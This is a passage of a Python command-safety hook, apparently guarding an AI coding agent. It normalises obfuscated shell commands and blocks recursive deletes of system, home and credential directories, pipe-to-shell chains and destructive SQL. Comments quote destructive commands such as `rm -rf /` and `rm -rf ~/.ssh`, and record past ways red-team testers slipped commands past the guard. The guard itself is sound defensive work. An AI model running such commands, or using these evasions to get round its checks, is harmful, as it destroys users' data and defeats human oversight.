        raise _AnalysisTooComplex(
            f"command binds {len(assignments)} variables, over the "
            f"{_MAX_RESOLVED_VARS}-variable analysis bound"
        )
    growth_cap = max_len * _CANONICAL_TOTAL_CAP_FACTOR
    # A value that itself names an assigned variable (`x=rm; y=$x; $y -rf /`)
    # spliced `$x` back in, which no later pass resolved: up to
    # _RESOLVE_PASSES passes run while a value still holds a `$`. One pass
    # already follows a reference to a name spliced LATER in this order
    # (`v0=$v1`), so further passes are needed only for a value naming an
    # earlier (or the same) name.
    names = list(assignments)
    chained = any(
        "$" in v and any("$" + m in v or "${" + m in v for m in names[: i + 1])
        for i, v in enumerate(assignments.values())
    )
    for _pass in range(_RESOLVE_PASSES if chained else 1):
        before = s
        for k, v in assignments.items():
            if not _substitutions_balanced(v):
                continue
            v = _strip_q(v)
            # The value is data, never a replacement TEMPLATE: handed to re.sub as
            # a string, `\d` in it is a bad escape (re.error -> "Hook error" ->
            # exit 1, which Claude Code treats as a non-blocking hook failure, so
            # EVERY check in this process failed open) and `\b` became a backspace.
            # `${k}` and `$k` in one scan (a value holding `$k` itself is
            # read by the next pass).
            if "$" + k not in s and "${" + k not in s:
                continue  # no use left to splice: skip the full rescan
            esc = re.escape(k)
            s = re.sub(r"\$(?:\{" + esc + r"\}|" + esc + r"\b)", lambda _m: v, s)
            # A value spliced into many uses multiplies the text it is spliced
            # into; stop before the rescan cost does.
            if len(s) > growth_cap:
                raise _AnalysisTooComplex(
                    f"variable resolution would produce {len(s)} characters, "
                    f"over the {growth_cap}-character analysis bound"
                )
        if s == before:
            break
    return s


_TRANSFORMS = (
    lambda x: _IFS_RE.sub(" ", x),
    _decode_ansi_c,
    _expand_braces,
    _resolve_subst,
    _resolve_vars,
)


def _transforms_for(max_len: int):
    """The transform chain with the size bound bound in, so the whole
    canonicalization reads one configured cap rather than re-reading it."""
    return (
        lambda x: _IFS_RE.sub(" ", x),
        _decode_ansi_c,
        lambda x: _expand_braces(x, max_len),
        _resolve_subst,
        lambda x: _resolve_vars(x, max_len),
    )


def _build_canonical_forms(command: str, max_len: int) -> tuple[str, ...]:
    """Every de-obfuscated reading of the command, bounded in count and in
    total size.

    Each transform is applied to every seed produced so far, so the seed list
    can double per transform and each seed can itself have been amplified.
    The pattern scan then runs over all of them: on the version that bounded
    only the input, 16 forms x ~2MB = 33MB of text out of a 32,766-byte
    command, 70s in this function alone (measured 2026-09-05). Both bounds
    below fail CLOSED."""
    transforms = _transforms_for(max_len)
    total_cap = max_len * _CANONICAL_TOTAL_CAP_FACTOR

    def guard(forms_so_far: int, total_so_far: int) -> None:
        if forms_so_far > _MAX_CANONICAL_FORMS:
            raise _AnalysisTooComplex(
                f"command yields more than {_MAX_CANONICAL_FORMS} canonical "
                f"forms to analyze"
            )
        if total_so_far > total_cap:
            raise _AnalysisTooComplex(
                f"canonical forms total {total_so_far} characters, over the "
                f"{total_cap}-character analysis bound"
            )

    seeds = [command]
    total = len(command)
    for t in transforms:
        for s in list(seeds):
            r = t(s)
            if r != s and r not in seeds:
                seeds.append(r)
                total += len(r)
                guard(len(seeds), total)
    composite = command
    for t in transforms:
        composite = t(composite)
    if composite not in seeds:
        seeds.append(composite)
        total += len(composite)
        guard(len(seeds), total)
    # One more composite per earlier value of a reassigned variable: the
    # default reading above keeps only the last one, which is not the value
    # at a use that comes before the reassignment.
    distinct: dict[str, set[str]] = {}
    for _pos, k, v in _assignment_words(command):
        distinct.setdefault(k, set()).add(v)
    most = max((len(v) for v in distinct.values()), default=1)
    for pick in range(min(most - 1, _MAX_EXTRA_PICKS)):
        alt = command
        for t in transforms[:-1]:
            alt = t(alt)
        alt = _resolve_vars(alt, max_len, pick=pick)
        if alt not in seeds:
            seeds.append(alt)
            total += len(alt)
            guard(len(seeds), total)

    forms: list[str] = []
    running = 0
    for s in seeds:
        # Deliberately NO plain `" ".join(shlex.split(s))` form — it strips
        # quotes globally, un-quoting legit data args and defeating
        # _structural_mask. Quote removal is resolved per token in the mask.
        for f in (s, _EMPTY_QUOTES_RE.sub("", s)):
            if f and f not in forms:
                forms.append(f)
                running += len(f)
                guard(len(forms), running)
    return tuple(forms)


# The canonicalization is the expensive half of both hooks, and one Bash tool
# call runs it four times on the same text: once in block_dangerous, then in
# network_egress_guard's is_network_egress and twice more inside
# extract_hosts. Caching it per process makes the egress path pay for it once.
# Keyed on the cap as well as the text so a test that patches the cap is not
# served a form list built under the previous one.
_CANONICAL_CACHE: dict[tuple[str, int], tuple[str, ...]] = {}
_CANONICAL_CACHE_ENTRIES = 4


def _canonical_forms(command: str, max_len: int | None = None) -> list[str]:
    if max_len is None:
        max_len = get_max_command_length()
    key = (command, max_len)
    cached = _CANONICAL_CACHE.get(key)
    if cached is None:
        # A raise is NOT cached: it is reached early and cheaply by design,
        # and caching it would keep an exception alive across a config change.
        cached = _build_canonical_forms(command, max_len)
        if len(_CANONICAL_CACHE) >= _CANONICAL_CACHE_ENTRIES:
            _CANONICAL_CACHE.clear()
        _CANONICAL_CACHE[key] = cached
    return list(cached)


# Patterns that span pipes/operators/shell-metacharacters — masking would split
# them apart. Match against RAW forms; they are not verb-substring-prone.
_RAW_ONLY = (
    r":\(\)",
    r"\|\s*(ba|z|c|k|da)?sh\b",
    r"cd\s+/\s*&&",
    # Destructive SQL lives inside a quoted argument, which the structural
    # mask drops; these patterns are anchored to a client binary + execute
    # flag so matching the raw form stays false-positive-safe.
    r"drop\s+database",
    r"truncate\s+table",
    r"dropDatabase",
)


def _is_raw_pattern(pattern: str) -> bool:
    return any(marker in pattern for marker in _RAW_ONLY)


def _logical_lines(form: str) -> list[str]:
    """Split a command on the newlines that end a command.

    A newline is a command separator unless a backslash escapes it (line
    continuation) or it sits inside quotes (a multi-line commit message is
    one argument). Splitting on every ``\\n`` would turn the second line of
    ``git commit -m "fix\\n mention of rm -rf /"`` into an unquoted command
    and block it; not splitting at all is what let line 1 decide the masking
    of every later line.
    """
    lines: list[str] = []
    buf: list[str] = []
    quote: str | None = None
    escaped = False
    for ch in form:
        if escaped:
            buf.append(ch)
            escaped = False
        elif ch == "\\" and quote != "'":
            buf.append(ch)
            escaped = True
        elif quote:
            if ch == quote:
                quote = None
            buf.append(ch)
        elif ch in "'\"":
            quote = ch
            buf.append(ch)
        elif ch == "\n":
            lines.append("".join(buf))
            buf = []
        else:
            buf.append(ch)
    lines.append("".join(buf))
    return lines


def _structural_mask(form: str) -> str:
    """Drop quoted multi-word DATA args so a dangerous string passed to
    echo/grep/git-commit is not matched; keep everything for shell interpreters
    (their arguments may be code).

    Masking is decided per command segment, and a segment ends at a newline
    as much as at ``;``. Splitting only on ``;|&`` made a two-line command a
    single segment whose FIRST line's head token decided the masking of every
    later line: after ``echo hi`` on line 1, the quoted argument of ``bash -c
    "rm -rf /"`` on line 2 was dropped as echo's data and the command passed;
    after ``bash build.sh`` on line 1, a commit message on line 2 was kept
    as code and blocked.

    A segment is masked only when _segment_is_inert_data proves it safe
    (2026-10-18): deciding on the FIRST token alone meant any prefix —
    ``X=1``, ``>/dev/null``, ``(``, ``if``, ``!``, ``time``, ``{`` or an
    unlisted wrapper like ``ionice``/``caffeinate`` — in front of ``bash -c
    '…'`` made the code string look like data and dropped it unchecked. A
    segment piped into a segment that is not inert data (``echo "…" | ionice
    bash``) is kept too: its output is that segment's input.
    """
    out = []
    keep_all = _DEFINES_RUNNER_RE.search(form) is not None
    binds = expands_into_code = False
    # Per line, the NON-EMPTY segments only, as [seg, toks, pipes_into_next,
    # force_keep]. An empty segment costs one strip: a run of 32 K `;` is
    # an analyzed input, and per-empty-segment bookkeeping made the mask 4x
    # main's cost on it. A segment piping into an EMPTY one (`echo "…" |`
    # at the end of a line, whose pipe continues on the next) is forced
    # kept — what the pipe feeds is not visible here.
    lines: list[list[list]] = []
    for line in _logical_lines(form):
        # `>&` / `<&` is a file-descriptor redirection, not a background `&`:
        # splitting there turned `2>&1 bash -c '…'` into a segment headed `1`.
        parts = re.split(r"(\|\||&&|[;|]|(?<![<>])&)", line)
        entries: list[list] = []
        prev_pipes = False
        for k in range(0, len(parts), 2):
            seg = parts[k].strip()
            toks: list[str] | None = []
            if seg:
                try:
                    toks = shlex.split(seg, comments=False, posix=True)
                except ValueError:
                    toks = None
            if toks == []:
                if prev_pipes:
                    entries[-1][3] = True
                prev_pipes = False
                continue
            prev_pipes = k + 1 < len(parts) and parts[k + 1] == "|"
            if toks:
                if _binds_variable(toks):
                    binds = True
                if any("$" in t for t in toks) and not _segment_is_inert_data(toks):
                    expands_into_code = True
            entries.append([seg, toks, prev_pipes, False])
        lines.append(entries)
    # `printf -v c "<cmd>"; eval "$c"`: the "data" is stored, then run. When
    # a command both binds a variable from a data head and expands a
    # variable in a non-data segment, nothing in it is masked.
    if binds and expands_into_code:
        keep_all = True
    for entries in lines:
        # Right to left: a segment is kept when it is not inert, or when it
        # pipes into a kept segment — transitively, so `echo "…" | cat | sh`
        # keeps the echo as well.
        keep = [False] * len(entries)
        next_kept = False
        for j in range(len(entries) - 1, -1, -1):
            _seg, toks, pipes, force = entries[j]
            inert = toks is not None and not keep_all and _segment_is_inert_data(toks)
            keep[j] = not inert or force or (pipes and next_kept)
            next_kept = keep[j]
        for (seg, toks, _pipes, _force), kept in zip(entries, keep):
            if toks is None:
                out.append(seg)
                continue
            joined = " ".join(t for t in toks if " " not in t and "\t" not in t)
            if not kept:
                out.append(joined)
                continue
            out.append(seg)
            # The view the first-token rule produced before 2026-10-18 is
            # checked TOO, so keeping a segment only ever adds checking: for
            # a non-interpreter head that was the quote-removed join, the
            # only form in which `'r'm -rf /` reads as `rm -rf /`.
            cmd = toks[0].lower().rsplit("/", 1)[-1]
            legacy_kept = cmd in _SHELL_LIKE or (
                cmd == "builtin" and _builtin_runs_command(toks)
            )
            if not legacy_kept and joined and joined != seg:
                out.append(joined)
    return " ; ".join(out)


# =============================================================================
# Recursive-rm catastrophic-target analysis
# -----------------------------------------------------------------------------
# Narrowing (2026-09-04): a recursive delete is blocked when — and only when — a
# target argument is unrecoverable. Scratch trees (/tmp, /private/tmp, $TMPDIR,
# /var/folders) and paths inside the project are as safe as a relative dirname
# and are NOT blocked; the filesystem root, a bare `*`, a whole system or home
# directory, an unknown or bare variable, and any `..` that escapes a scratch
# root are blocked in EVERY argument position. Runs over the STRUCTURALLY MASKED
# forms only: the mask drops quoted data arguments, so `grep "rm -rf /" src`,
# `git commit -m "...rm -rf /..."` and `echo "rm -rf /"` are data, not a delete,
# and stay allowed — a shell interpreter's argument (`sh -c 'rm -rf /'`) is kept
# by the mask and so is still caught.
# =============================================================================
_RM_WORD_RE = re.compile(r"(?<![A-Za-z0-9_.\-])rm(?![A-Za-z0-9_])", re.IGNORECASE)
_RM_SEGMENT_SPLIT_RE = re.compile(r"\|\||&&|[;|&\n]")
# System first-level directories whose recursive delete is catastrophic. Matches
# the previous _CATASTROPHIC_TARGET system list exactly (behaviour preserved).
# Compared case-insensitively (the old regex used re.IGNORECASE), so entries are
# lowercase here and the path is lowercased before the check.
_CATASTROPHIC_FIRST = frozenset(
    {
        "etc",
        "usr",
        "bin",
        "sbin",
        "lib",
        "boot",
        "sys",
        "dev",
        "root",
        "opt",
        "system",
        "library",
        "home",
    }
)
# Absolute scratch roots: a subpath here is as survivable as a relative dir.
_SAFE_ABS_ROOTS = ("/tmp", "/private/tmp", "/var/folders")
_VAR_REF_RE = re.compile(r"^\$\{?([A-Za-z_][A-Za-z0-9_]*)\b(?::-[^}]*)?\}?(.*)$")

# Paths INSIDE a home directory whose recursive delete is unrecoverable in the
# way the home root itself is: private keys, credentials and the macOS keychain.
# The narrowing made a path below a home root survivable-by-default (so
# `~/.cache/uv` and `~/Development/foo/build` stop being blocked) — which also
# made `rm -rf ~/.ssh` pass. These are the exceptions. Lower-case: the path is
# lower-cased before the check, matching the old re.IGNORECASE regex.
_CATASTROPHIC_HOME_SUBPATHS = (
    ".ssh",
    ".gnupg",
    "library",  # macOS: ~/Library/Keychains, ~/Library/Application Support
    ".config/gh",
    ".aws",
    ".kube",
)


def _lexical_norm(path: str) -> str:
    """posixpath.normpath, but collapse a run of leading slashes (`//`, `///`)
    to a single `/`.

    POSIX lets an implementation treat a leading `//` specially, so normpath
    keeps it — but for a delete target `//etc` is `/etc`, `//usr` is `/usr` and
    `//*` is `/*`. Leaving the doubled slash in place made every classifier
    below read component 1 as the empty string and allow the delete (found by
    the 2026-09-05 challenger: `rm -rf //etc` exited 0)."""
    return re.sub(r"^/{2,}", "/", posixpath.normpath(path))


# Glob and brace-expansion metacharacters. A path component containing one does
# not name a directory — it names whatever the shell expands it to INSIDE the
# parent, so the delete's blast radius is the parent, and the parent is what
# must be classified. `/Users/x/*` is "everything in that home" (catastrophic),
# `/Users/*/Documents` is "everything in /Users" (catastrophic), `/.*` is
# "everything at the root" (catastrophic) — while `/tmp/*` is still just /tmp
# and `~/.cache/uv/*` is still deep inside a home (both survivable).
_GLOB_META = "*?[]{}"


def _truncate_at_glob(p: str) -> str:
    """Return the prefix of an ABSOLUTE path up to its first glob component.

    Returns `/` when the very first component globs. Only used for absolute
    paths: truncating a relative one would turn `*.egg-info` into `.` (the
    working directory) and block ordinary build cleanup.
    """
    if not any(c in p for c in _GLOB_META):
        return p
    kept: list[str] = []
    for part in p.split("/"):
        if any(c in part for c in _GLOB_META):
            break
        kept.append(part)
    return "/".join(kept) or "/"


def _home_subpath_catastrophic(sub: str) -> bool:
    """Whether a path relative to a home ROOT is one of the unrecoverable ones.

    Matches the entry itself, anything under it, and anything that CONTAINS it:
    `~/.ssh`, `~/.ssh/id_ed25519` and `~/.config` (which holds `.config/gh`) are
    all catastrophic. Without that third case the wider delete would pass while
    the narrower one blocked — the same disagreement between two spellings that
    this whole analysis exists to remove.
    """
    sub = sub.strip("/")
    if not sub:
        return True
    for entry in _CATASTROPHIC_HOME_SUBPATHS:
        if sub == entry or sub.startswith(entry + "/") or entry.startswith(sub + "/"):
            return True
    return False


def _abs_target_catastrophic(p: str) -> bool:
    """Classify a normalised ABSOLUTE path. Safe scratch roots (and paths under
    them, and deep in-home paths) return False; the root, system directories,
    /var, /private, and a whole /Users home return True.

    Globs are resolved to their parent first, so `/*` arrives here as `/` and
    `/Users/x/*` as `/Users/x` — see _truncate_at_glob."""
    p = _truncate_at_glob(p)
    p = p.lower()  # case-insensitive, matching the previous re.IGNORECASE regex
    if p == "/":
        return True
    for root in _SAFE_ABS_ROOTS:
        if p == root or p.startswith(root + "/"):
            return False
    parts = p.split("/")
    first = parts[1] if len(parts) > 1 else ""
    if first in _CATASTROPHIC_FIRST:
        return True
    if first == "var":  # /var but not /var/folders (a safe root, handled above)
        return True
    if first == "private":  # /private but not /private/tmp (safe root above)
        return True
    if first == "users":
        # /Users, /Users/<name>, /Users/<name>/ delete a whole home; a path
        # deeper than the home root (a project checkout) is survivable, EXCEPT
        # the credential/keychain directories listed above.
        if len(parts) <= 3:
            return True
        return _home_subpath_catastrophic("/".join(parts[3:]))
    # Any other absolute path (e.g. /data/foo) is not on the catastrophic list —
    # left allowed, exactly as the previous denylist did.
    return False


def _var_target_catastrophic(t: str) -> bool:
    """Classify a `$VAR`-style target. `$TMPDIR/<sub>` is a session scratch path
    (allowed); bare `$TMPDIR`, `$TMPDIR/*` and an escaping `$TMPDIR/../..` are
    not. `$HOME/<sub>` is treated like `~/<sub>`. A command substitution, or any
    OTHER variable (value unknown — an empty expansion makes `$X/etc` mean
    `/etc`), is catastrophic."""
    if t.startswith("$(") or "`" in t:
        return True
    m = _VAR_REF_RE.match(t)
    if not m:
        return True
    name, rest = m.group(1), m.group(2)
    if name == "TMPDIR":
        if rest in ("", "/") or rest == "/*" or rest.endswith("/*"):
            return True
        if not rest.startswith("/") or "$" in rest:
            # A subpath that itself holds an unresolved variable is unknown —
            # it could expand to `..`, `/` or empty. Treat as catastrophic.
            return True
        # Model $TMPDIR shallowly under a safe root so a `..` run escapes it.
        return _abs_target_catastrophic(_lexical_norm("/private/tmp/_s" + rest))
    if name == "HOME":
        if rest in ("", "/") or "$" in rest:
            return True
        sub = rest if rest.startswith("/") else "/" + rest
        # A glob under $HOME needs the same guard $TMPDIR has above, and gets
        # it from _truncate_at_glob inside _abs_target_catastrophic: `$HOME/*`,
        # `$HOME/.*`, `$HOME/*.txt`, `$HOME/D*` and `$HOME/*/*` all classify as
        # the home root itself and block, while `$HOME/.cache/uv/*` classifies
        # as the deep directory and stays allowed — the same verdicts the `~`
        # spellings get. Before the truncation the glob component was counted
        # as a path level, so `$HOME/*` looked deeper than a home root and was
        # allowed (2026-09-05 challenger).
        return _abs_target_catastrophic(_lexical_norm("/Users/_me" + sub))
    return True


def _rm_target_catastrophic(t: str) -> bool:
    """Whether a single rm target argument is an unrecoverable delete."""
    t = t.strip().strip("'\"").strip()
    if not t:
        return False
    if t[0] == "$":
        return _var_target_catastrophic(t)
    if t[0] == "~":
        rest = t[1:]
        if rest in ("", "/"):
            return True
        sub = rest if rest.startswith("/") else "/" + rest
        return _abs_target_catastrophic(_lexical_norm("/Users/_me" + sub))
    if t == "*":
        return True
    if t.startswith("/"):
        return _abs_target_catastrophic(_lexical_norm(t))
    n = _lexical_norm(t)
    if n in (".", ""):
        return True
    if n == "*":
        return True
    if n == ".." or n.startswith("../"):  # escapes the working directory
        return True
    return False


def _has_recursive_flag(flags: list[str]) -> bool:
    for f in flags:
        if f == "--recursive":
            return True
        if f.startswith("--"):
            continue
        if "r" in f or "R" in f:
            return True
    return False


# shlex.split's whitespace, exactly (str.split() also splits on \xa0, \x1c…).
_SHLEX_WORD_RE = re.compile(r"[^ \t\r\n]+")
_SHLEX_SPECIAL = frozenset("'\"\\")


def _first_at_or_after(flags: list[bool], size: int) -> list[int]:
    """nxt[k] = the smallest index >= k with flags[index] true, else `size`."""
    nxt = [size] * (size + 1)
    for i in range(size - 1, -1, -1):
        nxt[i] = i if flags[i] else nxt[i + 1]
    return nxt


_RECURSIVE_LETTER_RE = re.compile(r"[rR]")


def _flag_span_recursive(seg: str, start: int, end: int) -> bool:
    """`_has_recursive_flag([seg[start:end]])` without the slice. The scan stops
    at the first `r`/`R`, so the heads of the `rm` words in one token (each a
    suffix of the next) cost linear time in total."""
    if end - start == 11 and seg.startswith("--recursive", start):
        return True
    if seg.startswith("--", start, end):
        return False
    return _RECURSIVE_LETTER_RE.search(seg, start, end) is not None


# A head longer than this is classified through _TokenSuffixes (a short
# surrogate with the same verdict); a shorter one is classified directly. The
# differential tests set it to 0 so every head takes the surrogate path.
_HEAD_EXACT_LIMIT = 64
# Surrogate shape. A first component longer than _SURROGATE_NAME_MIN can only
# ever be "a name" to the classifier (the longest constant it is compared with,
# `.config/gh`, is 10 characters). Pops beyond _SURROGATE_POPS and names beyond
# _SURROGATE_NAMES never change a verdict: the deepest prefix a target is
# joined to is `/private/tmp/_s` plus one component, and the classifier reads
# at most the first five components of a normalised path.
_SURROGATE_NAME_MIN = 16
_SURROGATE_POPS = 8
_SURROGATE_NAMES = 8
_VAR_NAME_RE = re.compile(r"\$\{?([A-Za-z_][A-Za-z0-9_]*)\b")
_GLOB_META_RE = re.compile("[" + re.escape(_GLOB_META) + "]")


class _TokenSuffixes:
    """`_rm_target_catastrophic(seg[i:end])` for every suffix of ONE token, in
    amortised O(1) per suffix after an O(len) pass over the token.

    Each suffix is replaced by a short surrogate that `_rm_target_catastrophic`
    classifies identically, and the real classifier runs on the surrogate. A
    surrogate is `F' + G'`: F is the text up to the suffix's first `/`, kept
    as-is unless it is long (then only "a name, with/without a glob, with/
    without a `$`" survives); G is the rest from that `/`, reduced to its
    normalised effect — how many components it pops, its first few names — plus
    the raw facts the classifier reads (`$` present, ends in `/*`). G's effect
    is computed once per `/`, right to left, so no suffix is ever re-read."""

    def __init__(self, seg: str, start: int, end: int) -> None:
        self.seg = seg
        b = end
        while b > start and seg[b - 1].isspace():  # str.strip()'s right end
            b -= 1
        self.b = b
        self.slashes = [i for i in range(start, b) if seg[i] == "/"]
        self.dollars = [i for i in range(start, b) if seg[i] == "$"]
        self.backticks = [i for i in range(start, b) if seg[i] == "`"]
        self.braces = [i for i in range(start, b) if seg[i] == "}"]
        self.globs = [m.start() for m in _GLOB_META_RE.finditer(seg, start, b)]
        # Right-to-left normalised effect of seg[slash:b] for every slash:
        # (pops, names as a cons list). A cons cell is
        # (name, rest, length, glob-in-this-name-or-later).
        self.effect: dict[int, tuple[int, tuple | None]] = {}
        pops, names = 0, None
        nxt = b
        for s in reversed(self.slashes):
            comp = seg[s + 1 : nxt]
            if comp in ("", "."):
                pass
            elif comp == "..":
                pops += 1
            elif pops:
                pops -= 1
            else:
                glob = _GLOB_META_RE.search(comp) is not None
                if names is not None:
                    names = (comp, names, names[2] + 1, glob or names[3])
                else:
                    names = (comp, None, 1, glob)
            self.effect[s] = (pops, names)
            nxt = s
        self._g_cache: dict[int, str] = {}

    @staticmethod
    def _any_in(sorted_positions: list[int], lo: int, hi: int) -> bool:
        i = bisect.bisect_left(sorted_positions, lo)
        return i < len(sorted_positions) and sorted_positions[i] < hi

    def _first_at(self, sorted_positions: list[int], lo: int, default: int) -> int:
        i = bisect.bisect_left(sorted_positions, lo)
        return sorted_positions[i] if i < len(sorted_positions) else default

    def _g(self, s: int) -> str:
        """Surrogate for seg[s:b], which starts with `/` and is > 2 chars."""
        cached = self._g_cache.get(s)
        if cached is not None:
            return cached
        seg, b = self.seg, self.b
        pops, names = self.effect[s]
        ends_star = seg.startswith("/*", b - 2)
        parts = ["/."]  # never "", "/" or "/*" — those are compared raw
        if self._any_in(self.dollars, s, b):
            parts.append("/$/..")  # a `$` the classifier sees, with no effect
        parts.append("/.." * min(pops, _SURROGATE_POPS))
        kept = []
        cell = names
        while cell is not None and len(kept) < _SURROGATE_NAMES:
            kept.append(cell[0])
            cell = cell[1]
        parts.extend("/" + name for name in kept)
        if cell is not None:  # more names than kept: only a glob among them counts
            parts.append("/*" if ends_star else ("/*x" if cell[3] else "/x"))
        elif kept and kept[-1] == "*" and not ends_star:
            parts.append("/.")  # keep `rest.endswith("/*")` as the raw text has it
        out = "".join(parts)
        if out[-1].isspace():
            out += "/."  # str.strip() must not eat a name's trailing whitespace
        self._g_cache[s] = out
        return out

    def _sur(self, e: int) -> str:
        """Surrogate for seg[e:b]."""
        seg, b = self.seg, self.b
        if e >= b:
            return ""
        s = self._first_at(self.slashes, e, b)
        if s - e <= _SURROGATE_NAME_MIN:
            first = seg[e:s]
        else:
            first = "L"
            if self._any_in(self.globs, e, s):
                first += "*"
            if self._any_in(self.dollars, e, s):
                first += "$"
        if s >= b:
            rest = ""
        elif b - s <= 2:
            rest = seg[s:b]
        else:
            rest = self._g(s)
        return first + rest

    def catastrophic(self, i: int) -> bool:
        """`_rm_target_catastrophic(seg[i:end])`."""
        seg, b = self.seg, self.b
        a = i
        while a < b and seg[a].isspace():  # str.strip()'s left end
            a += 1
        if a >= b:
            return False
        c0 = seg[a]
        if c0 == "$":
            if seg.startswith("$(", a, b) or self._any_in(self.backticks, a, b):
                return True
            m = _VAR_NAME_RE.match(seg, a, b)
            if m is None or m.group(1) not in ("TMPDIR", "HOME"):
                return True
            q = m.end()
            if seg.startswith(":-", q, b):  # `(?::-[^}]*)?`, greedy
                q = self._first_at(self.braces, q + 2, b)
            if q < b and seg[q] == "}":
                q += 1
            return _rm_target_catastrophic("${" + m.group(1) + "}" + self._sur(q))
        if c0 == "~":
            return _rm_target_catastrophic("~" + self._sur(a + 1))
        return _rm_target_catastrophic(self._sur(a))


def _rm_segment_linear(seg: str):
    """`_rm_segment_catastrophic_reference` in one pass, for a segment with no
    quote or backslash (there shlex.split is plain whitespace splitting, so the
    tokens after any `rm` are a suffix of the whole segment's tokens).

    The reference re-tokenises the rest of the segment for every `rm` word, which
    is quadratic in the number of `rm` words that are their own arguments
    (`"rm " * 10800` took 62 s). Here each token is classified once and four
    suffix tables answer "does an rm at token k see a recursive flag?" and
    "what is its first catastrophic target?" in O(1)."""
    words = [(m.start(), m.end()) for m in _SHLEX_WORD_RE.finditer(seg)]
    count = len(words)
    toks = [seg[a:b] for a, b in words]
    is_dd = [t == "--" for t in toks]
    flaglike = [len(t) > 1 and t[0] == "-" and t != "--" for t in toks]
    recursive = [fl and _has_recursive_flag([t]) for fl, t in zip(flaglike, toks)]
    matches = list(_RM_WORD_RE.finditer(seg))
    if not matches or "-" not in seg:  # a recursive flag needs a dash
        return None
    cat = [_rm_target_catastrophic(t) for t in toks]
    next_dd = _first_at_or_after(is_dd, count)
    next_rec = _first_at_or_after(recursive, count)
    next_cat_target = _first_at_or_after(
        [c and not fl and not dd for c, fl, dd in zip(cat, flaglike, is_dd)], count
    )
    next_cat_any = _first_at_or_after(
        [c and not dd for c, dd in zip(cat, is_dd)], count
    )
    starts = [a for a, _ in words]
    ends = [b for _, b in words]
    suffixes: dict[int, _TokenSuffixes] = {}
    for m in matches:
        # Tokens after this `rm`: the tail of the token it sits in (when it ends
        # mid-token), then every later token. The head is kept as a span, not a
        # slice: every `rm` inside one long token has the REST of that token as
        # its head, so slicing (or classifying) each one afresh was quadratic
        # (`"/rm" * 10900 + " -r x"` took 1.65 s).
        k = bisect.bisect_right(starts, m.end() - 1)  # first token starting >= m.end()
        head = None
        hs = he = m.end()
        if k > 0 and ends[k - 1] > m.end():
            he = ends[k - 1]
            head = True
        end_opts = False
        head_flag_recursive = False
        is_flag_head = he - hs > 1 and seg[hs] == "-"
        if head is not None:
            if he - hs == 2 and seg.startswith("--", hs):
                end_opts = True
            elif is_flag_head:
                head_flag_recursive = _flag_span_recursive(seg, hs, he)
        if end_opts:
            recursive_seen = False
        else:
            dd = next_dd[k]
            recursive_seen = head_flag_recursive or next_rec[k] < dd
        if not recursive_seen:
            continue
        # Targets, in order: the head (when it is a target), then either every
        # non-flag token before the first `--` followed by everything after it,
        # or (the head was `--`) every remaining token.
        if head is not None and not end_opts:
            if not is_flag_head:
                if he - hs <= _HEAD_EXACT_LIMIT:
                    hit_head = _rm_target_catastrophic(seg[hs:he])
                else:
                    tok_suffixes = suffixes.get(k - 1)
                    if tok_suffixes is None:
                        tok_suffixes = _TokenSuffixes(seg, starts[k - 1], he)
                        suffixes[k - 1] = tok_suffixes
                    hit_head = tok_suffixes.catastrophic(hs)
                if hit_head:
                    return seg[hs:he]
        elif head is not None and end_opts:
            pass  # `--` itself is neither flag nor target
        if end_opts:
            hit = next_cat_any[k]
        else:
            hit = next_cat_target[k]
            if hit >= next_dd[k]:
                hit = next_cat_any[next_dd[k] + 1] if next_dd[k] < count else count
        if hit < count:
            return toks[hit]
    return None


def _rm_segment_catastrophic(seg: str):
    """Find every `rm` word in one command segment, gather its flags and target
    arguments, and return the first catastrophic target (or None)."""
    if _SHLEX_SPECIAL.isdisjoint(seg):
        return _rm_segment_linear(seg)
    return _rm_segment_catastrophic_reference(seg)


def _rm_segment_catastrophic_reference(seg: str):
    """The original per-`rm` walk. Kept for segments that contain a quote or a
    backslash (quote state then decides the tokens) and as the differential
    tests' oracle."""
    for m in _RM_WORD_RE.finditer(seg):
        rest = seg[m.end() :]
        try:
            tokens = shlex.split(rest, comments=False, posix=True)
        except ValueError:
            tokens = rest.split()
        flags: list[str] = []
        targets: list[str] = []
        end_opts = False
        for tok in tokens:
            if not end_opts and tok == "--":
                end_opts = True
                continue
            if not end_opts and len(tok) > 1 and tok.startswith("-"):
                flags.append(tok)
                continue
            targets.append(tok)
        if not _has_recursive_flag(flags):
            continue
        for target in targets:
            if _rm_target_catastrophic(target):
                return target
    return None


def _rm_catastrophic_target(forms):
    """Scan masked canonical forms for a recursive rm on a catastrophic target.
    Subshell/group delimiters become segment separators so `(rm -rf /)` and
    `{ rm -rf /; }` are split into their own command segments."""
    for form in forms:
        # Split subshell parens into their own segments so `(rm -rf /)` is seen.
        # Brace groups (`{ rm -rf /; }`) already split on their internal `;`, and
        # `{` / `}` must be left intact so `${TMPDIR}` is not shredded into a
        # bare `$` target.
        norm = re.sub(r"[()]", " ; ", form)
        views = [norm]
        if "`" in norm:
            # A backtick delimits a command substitution as `$(` … `)` does:
            # unsplit, `bash -c "`rm -rf /`"` read its target as "/`" and
            # passed (2026-10-18). The split view is checked IN ADDITION to
            # the unsplit one, never instead: split alone, `rm -rf `pwd`/..`
            # loses its target to the next segment and would pass.
            views.append(norm.replace("`", " ; "))
        for view in views:
            for seg in _RM_SEGMENT_SPLIT_RE.split(view):
                seg = seg.strip()
                if not seg or "rm" not in seg.lower():
                    continue
                hit = _rm_segment_catastrophic(seg)
                if hit is not None:
                    return hit
    return None


# =============================================================================
# Pipe-to-shell chains (linear scanners for two former regexes)
# -----------------------------------------------------------------------------
# Both matchers below were single regexes of the shape
#     <start> … `|` (<word> … `|`)* <shell>
# The lazy/greedy span before the first pipe, and the stage loop, are ambiguous
# with each other, so on `"echo x | " * N` the engine tried O(N^2) pipe pairs
# times O(N) stage counts: 800 repeats ~50 s, 2000 repeats of the base64 form
# > 120 s (past the hook timeout, i.e. an allow). PR #650 bounded them with the
# analysis deadline; these scanners make them linear instead.
#
# The trick is the same for both: a stage consumes exactly up to the NEXT pipe,
# so "the tail from pipe P reaches a shell" depends only on P. It is computed
# once per pipe, right to left, and each start position then needs one bisect.
# The old regexes stay (`*_REGEX`) — the differential tests use them as the
# oracle, and OBFUSCATION_PATTERNS is read as plain regexes elsewhere.
# =============================================================================
_SHELL_TAIL_RE = re.compile(r"(?:ba|z|c|k|da)?sh\b")
_SHELL_TAIL_RE_I = re.compile(r"(?:ba|z|c|k|da)?sh\b", re.IGNORECASE)
_WORD_THEN_SPACE_RE = re.compile(r"\w+\s")
_WORD_RE = re.compile(r"\w")
_SPACE_RUN_RE = re.compile(r"\s*")
